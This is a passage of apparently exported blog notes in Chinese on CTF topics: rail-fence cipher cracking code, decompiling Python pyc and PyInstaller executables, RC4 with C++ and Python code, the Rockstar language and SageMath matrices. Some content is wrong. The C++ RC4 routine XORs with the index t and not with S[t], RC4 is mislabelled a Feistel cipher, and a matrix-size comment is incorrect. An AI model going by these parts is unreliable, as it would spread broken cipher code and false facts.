<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取 w 型矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">railfence_w</span>(<span class="params">data:<span class="built_in">str</span>, key:<span class="built_in">int</span></span>):</span><br><span class="line">    mat = [[<span class="literal">None</span>]*<span class="built_in">len</span>(data) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key)]</span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    upflag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        mat[row][col] = data[col]</span><br><span class="line">        <span class="keyword">if</span> row == key-<span class="number">1</span>:</span><br><span class="line">            upflag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> row == <span class="number">0</span>:</span><br><span class="line">            upflag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> upflag:</span><br><span class="line">            row -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            row += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> mat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">railfence_w_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    mat = railfence_w(data, key)</span><br><span class="line">    msg = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(key):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> mat[row][col] != <span class="literal">None</span>:</span><br><span class="line">                msg.append(mat[row][col])</span><br><span class="line">    <span class="keyword">return</span> mat, msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">railfence_w_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    mat = railfence_w(data, key)</span><br><span class="line">    sub = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(key):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> mat[row][col] != <span class="literal">None</span>:</span><br><span class="line">                mat[row][col] = data[sub]</span><br><span class="line">                sub += <span class="number">1</span></span><br><span class="line">    msg = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(key):</span><br><span class="line">            <span class="keyword">if</span> mat[row][col] != <span class="literal">None</span>:</span><br><span class="line">                msg.append(mat[row][col])</span><br><span class="line">    <span class="keyword">return</span> mat, msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_w</span>(<span class="params">data:<span class="built_in">str</span>, needkeys:<span class="built_in">bool</span>=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> needkeys:</span><br><span class="line">        keys = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(data))]</span><br><span class="line">        <span class="keyword">return</span> keys, [<span class="string">&#x27;&#x27;</span>.join(railfence_w_decode(data, k)[<span class="number">1</span>]) <span class="keyword">for</span> k <span class="keyword">in</span> keys]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;&#x27;</span>.join(railfence_w_decode(data, k)[<span class="number">1</span>]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(data))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_crack_w</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">    keys, msg = crack_w(data, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> k, m <span class="keyword">in</span> <span class="built_in">zip</span>(keys, msg):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>栏: <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">print_crack_w(<span class="string">&quot;ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g&quot;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>python 逆向笔记</title>
    <url>//re-python-note.html</url>
    <content><![CDATA[<h1 id="pyc-文件">PYC 文件</h1>
<p>pyc 文件是 python 在编译过程中出现的主要中间过程文件。pyc
文件是二进制的，类似 java 的字节码，可以由 python 虚拟机直接执行的。</p>
<h2 id="pycodeobject">PyCodeObject</h2>
<p>实际上，pyc 文件就是 PyCodeObject 对象在硬盘上的保存形式。</p>
<p>而 PyCodeObject 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="type">int</span> co_argcount;        <span class="comment">/* 位置参数个数 */</span></span><br><span class="line">    <span class="type">int</span> co_nlocals;         <span class="comment">/* 局部变量个数 */</span></span><br><span class="line">    <span class="type">int</span> co_stacksize;       <span class="comment">/* 栈大小 */</span></span><br><span class="line">    <span class="type">int</span> co_flags;   </span><br><span class="line">    PyObject *co_code;      <span class="comment">/* 字节码指令序列 */</span></span><br><span class="line">    PyObject *co_consts;    <span class="comment">/* 所有常量集合 */</span></span><br><span class="line">    PyObject *co_names;     <span class="comment">/* 所有符号名称集合 */</span></span><br><span class="line">    PyObject *co_varnames;  <span class="comment">/* 局部变量名称集合 */</span></span><br><span class="line">    PyObject *co_freevars;  <span class="comment">/* 闭包用的的变量名集合 */</span></span><br><span class="line">    PyObject *co_cellvars;  <span class="comment">/* 内部嵌套函数引用的变量名集合 */</span></span><br><span class="line">    <span class="comment">/* The rest doesn’t count for hash/cmp */</span></span><br><span class="line">    PyObject *co_filename;  <span class="comment">/* 代码所在文件名 */</span></span><br><span class="line">    PyObject *co_name;      <span class="comment">/* 模块名|函数名|类名 */</span></span><br><span class="line">    <span class="type">int</span> co_firstlineno;     <span class="comment">/* 代码块在文件中的起始行号 */</span></span><br><span class="line">    PyObject *co_lnotab;    <span class="comment">/* 字节码指令和行号的对应关系 */</span></span><br><span class="line">    <span class="type">void</span> *co_zombieframe;   <span class="comment">/* for optimization only (see frameobject.c) */</span></span><br><span class="line">&#125; PyCodeObject;</span><br></pre></td></tr></table></figure>
<h2 id="pyobject_head">PyObject_HEAD</h2>
<p>不同的 Python 版本会有不同的
PyObject_HEAD，以下是各版本的文件头：</p>
<table>
<thead>
<tr class="header">
<th>Python 版本</th>
<th>十六进制文件头</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Python 2.7</td>
<td><code>03f30d0a00000000</code></td>
</tr>
<tr class="even">
<td>Python 3.0</td>
<td><code>3b0c0d0a00000000</code></td>
</tr>
<tr class="odd">
<td>Python 3.1</td>
<td><code>4f0c0d0a00000000</code></td>
</tr>
<tr class="even">
<td>Python 3.2</td>
<td><code>6c0c0d0a00000000</code></td>
</tr>
<tr class="odd">
<td>Python 3.3</td>
<td><code>9e0c0d0a0000000000000000</code></td>
</tr>
<tr class="even">
<td>Python 3.4</td>
<td><code>ee0c0d0a0000000000000000</code></td>
</tr>
<tr class="odd">
<td>Python 3.5</td>
<td><code>170d0d0a0000000000000000</code></td>
</tr>
<tr class="even">
<td>Python 3.6</td>
<td><code>330d0d0a0000000000000000</code></td>
</tr>
<tr class="odd">
<td>Python 3.7</td>
<td><code>420d0d0a000000000000000000000000</code></td>
</tr>
<tr class="even">
<td>Python 3.8</td>
<td><code>550d0d0a000000000000000000000000</code></td>
</tr>
<tr class="odd">
<td>Python 3.9</td>
<td><code>610d0d0a000000000000000000000000</code></td>
</tr>
<tr class="even">
<td>Python 3.10</td>
<td><code>6f0d0d0a000000000000000000000000</code></td>
</tr>
<tr class="odd">
<td>Python 3.11</td>
<td><code>a70d0d0a000000000000000000000000</code></td>
</tr>
</tbody>
</table>
<p>可以注意到，实际上有改变的只有开头的<strong>两个字节</strong>。</p>
<h2 id="反编译">反编译</h2>
<p>使用 uncompyle 可以将 pyc 文件完美反编译。<a href="https://github.com/rocky/python-uncompyle6">uncompyle6
Github主页</a></p>
<p>可以直接使用 pip 包管理工具安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install uncompyle</span><br></pre></td></tr></table></figure>
<p>而 uncompyle 用法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uncompyle6 *.pyc</span><br></pre></td></tr></table></figure>
<p>uncomyle6 会直接将反编译后的源码输出在标准输出中，推荐用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uncompyle6 *.pyc &gt; filename</span><br></pre></td></tr></table></figure>
<p>将源码输出到文件里面，比如说：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uncompyle6 test.pyc &gt; test.py</span><br></pre></td></tr></table></figure>
<p>有时候 uncompyle6 可能出于某些原因，反编译失败，这时可以使用<a href="https://tool.lu/pyc/">在线网站</a>进行反编译。</p>
<p>有的时候对于某些源码可能无法完全反编译成功，这个时候需要借助工具
pycdas 反字节码。</p>
<p>pycdas 需要在 GitHub 上克隆仓库 pycdc 的源码后编译获得。</p>
<h2 id="反反编译">反反编译</h2>
<h3 id="更改魔术头">更改魔术头</h3>
<p>当想要保护我们的 pyc 文件不被反编译，最简单的做法就是更改魔术头，即
PyObject_HEAD。</p>
<p>可能是完全删除魔术头，也可能是修改为不是原生版本的魔术头，我们只需要根据情况添加或修改即可。</p>
<p>有关魔术头可以直接参考 <a href="#PyObject_HEAD">PyObject_HEAD</a></p>
<h1 id="exe-文件">EXE 文件</h1>
<p>使用 PyInstaller 进行封装的 exe 可执行文件，可以使用 pyinstxtractor
进行反编译。<a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor
Github主页</a></p>
<p>基本用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 pyinstxtractor.py *.exe</span><br></pre></td></tr></table></figure>
<p>pyinstxtractor 会将 exe 文件拆分回单独的 pyc 文件、pyd 文件，并且会在
pyc 文件中加入当前 python 版本的魔术头
(如果原代码版本不是所使用的版本，会有 warning 提示，需要注意)。</p>
<p>特别地，如果 python 版本与 exe 版本不对，会导致 pyz
无法解压，这时候需要改用基于 xdis 版本的 <a href="https://github.com/pyinstxtractor/pyinstxtractor-ng">pyinstxtractor</a>。</p>
<h1 id="pyd-文件">PYD 文件</h1>
<p>pyd 文件相当于 python 的运行时 dll，在 python 代码中可以直接使用
<code>import</code> 将 pyd 文件当作模块导入。</p>
<p>对于 pyd 的逆向，我们需要借助 ida 的 <code>attach</code>
动态调试跟静态分析。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>re</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>rc4 笔记</title>
    <url>//rc4-note.html</url>
    <content><![CDATA[<h1 id="rc4-原理">RC4 原理</h1>
<h2 id="简述">简述</h2>
<p>在密码学中，RC4（来自Rivest Cipher
4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法，属于
Feistel 密码结构。</p>
<p>但不同于DES的是，RC4不是对明文进行分组处理，而是字节流的方式依次加密明文中的每一个字节，解密的时候也是依次对密文中的每一个字节进行解密。</p>
<h2 id="流密码">流密码</h2>
<p><strong>定义：</strong>流密码是对称密码算法，从明文输入流逐位或逐字节产生密文输出。</p>
<p><strong>实例：</strong>使用最广泛的流密码是RC4。</p>
<p><strong>流密码结构：</strong></p>
<figure>
<img src="/rc4-note/929265-20160620213554647-682128679.jpg" alt="流密码结构图">
<figcaption aria-hidden="true">流密码结构图</figcaption>
</figure>
<p>流密码类似于”一次一密”，不同的是”一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。</p>
<p><strong>设计流密码的主要因素：</strong></p>
<ol type="1">
<li>加密序列的周期要长，若出现重复的周期过短，容易被破解</li>
<li>密钥流应该尽可能地接近真正随机数流的特征</li>
<li>密钥长度要长，以避免琼穷举攻击</li>
</ol>
<h2 id="算法逻辑结构">算法逻辑结构</h2>
<figure>
<img src="/rc4-note/929265-20160620213652444-560250478.jpg" alt="密钥流的生成">
<figcaption aria-hidden="true">密钥流的生成</figcaption>
</figure>
<h2 id="算法关键变量">算法关键变量</h2>
<ol type="1">
<li>密钥流：RC4算法的关键是根据明文和密钥生成相应的密钥流，密钥流的长度和明文的长度是对应的，也就是说明文的长度是500字节，那么密钥流也是500字节。当然，加密生成的密文也是500字节，因为密文第i字节=明文第
i 字节 ^ 密钥流第 i 字节；</li>
<li>状态向量S：长度为256，S[0],S[1].....S[255]。每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换；</li>
<li>临时向量T：长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给T，否则，轮转地将密钥的每个字节赋给T；</li>
<li>密钥K：长度为1-256字节，注意密钥的长度与明文长度、密钥流的长度没有必然关系，通常密钥的长度趣味16字节（128比特）。</li>
</ol>
<h2 id="算法描述">算法描述</h2>
<ol type="1">
<li><p>初始化状态向量S</p>
<p>给S的元素依次初始化0~255</p></li>
<li><p>初始化临时向量T</p>
<p>若密钥K长度小于256字节，则进行轮转填充状态向量T</p></li>
<li><p>对状态向量S进行置换操作</p>
<p>按照以下规则打乱状态向量S</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">j = 0;</span><br><span class="line">for (i = 0; i &lt; 256; i++)</span><br><span class="line">&#123;</span><br><span class="line">    j = (j + S[i] + T[i]) mod 256;</span><br><span class="line">    swap(S[i], S[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理后，状态向量S几乎带有一定的随机性</p></li>
<li><p>密钥流的生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i, j = 0;</span><br><span class="line">for (r = 0; r &lt; dataLength; r++)</span><br><span class="line">&#123;</span><br><span class="line">	i = (i + 1) mod 256;</span><br><span class="line">	j = (j + S[i]) mod 256;</span><br><span class="line">	swap(S[i], S[j]);</span><br><span class="line">	t = (S[i] + S[j]) mod 256;</span><br><span class="line">	z[r] = S[t]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 z[r] 为每一位的密钥流</p></li>
<li><p>加解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (i = 0; i &lt; dataLength; i++)</span><br><span class="line">&#123;</span><br><span class="line">	data[i] ^= z[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="c-实现">C++ 实现</h1>
<p>其中 S 必须为 <code>char S[256]</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">char</span>* S, <span class="type">char</span>* K, <span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> T[<span class="number">256</span>];</span><br><span class="line">	<span class="type">size_t</span> i, j;</span><br><span class="line">	<span class="type">char</span> t;</span><br><span class="line">	<span class="comment">// 初始化状态向量S与临时向量T</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		S[i] = i;</span><br><span class="line">		T[i] = K[i % len];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 对状态向量S进行置换操作</span></span><br><span class="line">	j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		j = (j + T[i] + S[i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// swap(S[i], S[j]);</span></span><br><span class="line">		t = S[i];</span><br><span class="line">		S[i] = S[j];</span><br><span class="line">		S[j] = t;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4</span><span class="params">(<span class="type">char</span>* S, <span class="type">char</span>* data, <span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> t;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> r = <span class="number">0</span>; r &lt; len; r++)</span><br><span class="line">	&#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// swap(S[i], S[j]);</span></span><br><span class="line">		t = S[i];</span><br><span class="line">		S[i] = S[j];</span><br><span class="line">		S[j] = t;</span><br><span class="line"></span><br><span class="line">		t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">		data[r] ^= t;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="python-实现">Python 实现</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&quot;</span></span><br><span class="line">key = <span class="string">&quot;carol&quot;</span></span><br><span class="line"></span><br><span class="line">rc4 = ARC4.new(key.encode())</span><br><span class="line">res = rc4.decrypt(base64.b64decode(data))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>rc4</tag>
      </tags>
  </entry>
  <entry>
    <title>rockstar 语言笔记</title>
    <url>//rockstar-note.html</url>
    <content><![CDATA[<h1 id="rockstar-简述">Rockstar 简述</h1>
<p>Rockstar
是一种动态类型的计算机编程语言，专为创建歌词程序而设计。Rockstar 深受
1980 年代硬摇滚和力量民谣的抒情惯例的影响。</p>
<p>Github 主页: <a href="https://github.com/RockstarLang/rockstar">https://github.com/RockstarLang/rockstar</a></p>
<p>Rocky 是用 Java 编写的完全符合规范的 Rockstar
实现，是目前唯一支持原始语言规范中描述的 DEC64 数字类型的 Rockstar
实现。</p>
<h1 id="rockstar-规范">rockstar 规范</h1>
<p>rockstar 语言文件一般以 <code>.rock</code>
作为文件后缀，但实质上是文本文件。</p>
<p>公共变量由关键字 a，an，the，my
或自行定义的特定变量名称之一组成，该名称必须仅包含小写ASCII字母 a-z
。变量中允许出现空格。</p>
<p>同时变量是动态类型的，不需要在使用前声明变量。</p>
<p>语言里有所谓的代词，指代解析顺序所确定的最后一个被命名变量。关键字包含
it，she，he，they，ze，hir，zie，zir，xe，xem，ve 和 ver。</p>
<p>赋值和读取语句关键词包括 is，put in，give back ，listen
等。为了保证语言的纯洁性，尽量不要使用阿拉伯数字。</p>
<p>以下是<strong>语言用法示范</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">My heart is true</span><br></pre></td></tr></table></figure>
<p>相当于说 My heart 被赋予布尔逻辑中的真值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Put my heart in your hand</span><br></pre></td></tr></table></figure>
<p>把 my heart 的值传递给变量 your hand。</p>
<h1 id="rockstar-py">rockstar-py</h1>
<p>rockstar-py 是 rockstar 用 python3 的一个实现。<a href="https://github.com/yyyyyyyan/rockstar-py">rockstar-py
Github主页</a></p>
<p>首先 rockstar-py 仅支持 python3.6 及以上版本，可以直接使用 pip
包管理工具安装它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install rockstar-py</span><br></pre></td></tr></table></figure>
<p>之后可以使用 <code>rockstar-py -h</code> 以获取更多帮助。</p>
<p>以下仅为<strong>常用参数介绍</strong>：</p>
<ul>
<li><p>将 <code>fizz.rock</code> 文件翻译为 Python 文件
<code>fizz.py</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rockstar-py -i fizz.rock -o fizz.py</span><br></pre></td></tr></table></figure></li>
<li><p>直接运行 <code>fizz.rock</code> 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rockstar-py -i fizz.rock --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>rockstar</tag>
      </tags>
  </entry>
  <entry>
    <title>sagemath 方程求解笔记</title>
    <url>//sagemath-equation-note.html</url>
    <content><![CDATA[<p><a href="https://sagecell.sagemath.org/">sagemath
在线运行网站</a></p>
<p><a href="https://www.lainme.com/doku.php/topic/sage/chapter_02/section_08">线性代数中文文档</a></p>
<h1 id="矩阵操作">矩阵操作</h1>
<ul>
<li><p>环</p>
<ul>
<li><code>ZZ</code> → 整数环</li>
<li><code>QQ</code> → 有理数环</li>
<li><code>Zmod(p)</code> → p为素数，定义在<span class="math inline">\(Z_p\)</span>上的环</li>
</ul></li>
<li><p>矩阵声明</p>
<ul>
<li><p>完整定义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 矩阵所在环, 矩阵行, 矩阵列, 矩阵元素初始化</span></span><br><span class="line">mt = matrix(ZZ, <span class="number">3</span>, <span class="number">2</span>, <span class="built_in">range</span>(<span class="number">6</span>))		<span class="comment"># 即定义在整数环上的 3行4列 矩阵</span></span><br></pre></td></tr></table></figure></li>
<li><p>空矩阵</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认矩阵元素为 0</span></span><br><span class="line">mt = matrix(ZZ, <span class="number">3</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>缺省定义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对应生成在有理数环上的 3列 矩阵</span></span><br><span class="line">mt = matrix(QQ, <span class="number">3</span>, <span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line"><span class="comment"># 对应生成在有理数环上的列矩阵</span></span><br><span class="line">mt = matrix(QQ, <span class="built_in">range</span>(<span class="number">6</span>))</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>添加行</p>
<ul>
<li><p>在末尾添加一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mt = mt.stack(vector([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br></pre></td></tr></table></figure></li>
<li><p>在指定行插入一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 行号, 元素</span></span><br><span class="line">mt = mt.insert_row(<span class="number">1</span>, vector([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>修改元素值</p>
<ul>
<li><p>修改单值 (类似修改二维数组)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将第 3 行第 4 列的值修改为 1</span></span><br><span class="line">mt[<span class="number">2</span>, <span class="number">3</span>] = <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><p>修改一行的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将第 3 行的值依次修改为列表中的值</span></span><br><span class="line">mt[<span class="number">2</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>求秩</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mt.rank()</span><br></pre></td></tr></table></figure></li>
<li><p>求行数、列数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mt.nrows()	<span class="comment"># 将返回矩阵行数</span></span><br><span class="line">mt.ncols()	<span class="comment"># 将返回矩阵列数</span></span><br></pre></td></tr></table></figure></li>
<li><p>求行列式的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mt.determinant()</span><br></pre></td></tr></table></figure></li>
<li><p>求逆</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 判断是否可逆</span></span><br><span class="line">mt.is_invertible()</span><br><span class="line"><span class="comment"># 求逆</span></span><br><span class="line">mt.inverse()</span><br><span class="line">mt ** -<span class="number">1</span></span><br><span class="line">mt ^ -<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><p>改变矩阵所处环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将矩阵的环改为 ZZ</span></span><br><span class="line">mt.change_ring(ZZ)</span><br></pre></td></tr></table></figure></li>
<li><p>求解线性方程和线性相关组</p>
<ul>
<li><p>求解 <span class="math inline">\(Ax=B\)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = A.solve_right(B)</span><br><span class="line">x = A.inverse() * B</span><br><span class="line">x = A \ B</span><br></pre></td></tr></table></figure></li>
<li><p>求解 <span class="math inline">\(xA=B\)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = A.solve_left(B)</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>寻找线性相关的行向量</p>
<ul>
<li><p>满足 <span class="math inline">\(xA=0\)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = A.left_kernel()</span><br></pre></td></tr></table></figure></li>
<li><p>满足 <span class="math inline">\(Ax=0\)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = A.right_kernel()</span><br></pre></td></tr></table></figure></li>
<li><p>找 <span class="math inline">\(x\)</span> 中指定行向量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解 x 中的第 1 行</span></span><br><span class="line">x.gen(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>求最短正交基 (LLL格基约简算法)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mt.LLL()</span><br></pre></td></tr></table></figure></li>
</ul></li>
</ul>
<h1 id="高斯消元法">高斯消元法</h1>
<p>高斯消元法求解多元一次方程，即求解 <span class="math display">\[
Ax=B
\]</span> 利用 sagemath 的矩阵运算轻松求解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系数矩阵</span></span><br><span class="line">A = matrix(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">A[<span class="number">0</span>, <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">A[<span class="number">1</span>, <span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常数向量</span></span><br><span class="line">B = vector([<span class="number">3</span>, <span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到未知数向量</span></span><br><span class="line">x = A \ B</span><br></pre></td></tr></table></figure>
<h1 id="一次同余式">一次同余式</h1>
<p>求解一次同余式即求解 <span class="math display">\[
Ax\equiv B\ (mod\ m)
\]</span> 在 sagemath 中引入环后，同理高斯消元法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="number">2</span></span><br><span class="line"><span class="comment"># 系数矩阵</span></span><br><span class="line">A = matrix(Zmod(m), <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">A[<span class="number">0</span>, <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">A[<span class="number">1</span>, <span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常数向量</span></span><br><span class="line">B = vector([<span class="number">3</span>, <span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到未知数向量</span></span><br><span class="line">x = A \ B</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>sagemath</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>sagemath 入门笔记</title>
    <url>//sagemath-get-started.html</url>
    <content><![CDATA[<h1 id="sagemath-简述">Sagemath 简述</h1>
<p>Sage（或称SageMath）是在GPL协议下发布的开源数学软件，并且整合了许多已有的开源软件包到一个基于Python的统一界面下。其目标是创造一个Magma,
Maple, Mathematica 和 Matlab 的开源替代品。</p>
<p>Sage
包含了从线性代数、微积分，到密码学、数值计算、组合数学、群论、图论、数论等各种初高等数学的计算功能。</p>
<p>虽然 Sage 想要取代 Matlab，但使用上还是有一定的局限性。</p>
<p>现在的 Sage 版本是基于 Python3 的。</p>
<h1 id="sagemath-安装">Sagemath 安装</h1>
<p>在 <a href="https://www.sagemath.org/download.html">https://www.sagemath.org/download.html</a>
中选择相应的安装程序下载并安装。</p>
<h2 id="windows-sage">Windows &amp; Sage</h2>
<p>Sage 不在官网中提供 Windows 的二进制文件下载，需要在其 github
官方发布页中下载：</p>
<p><a href="https://github.com/sagemath/sage-windows/releases">https://github.com/sagemath/sage-windows/releases</a></p>
<p>选择自己需要的版本，下载：</p>
<figure>
<img src="/sagemath-get-started/Sage%20Assets.png" alt="Sage Assets">
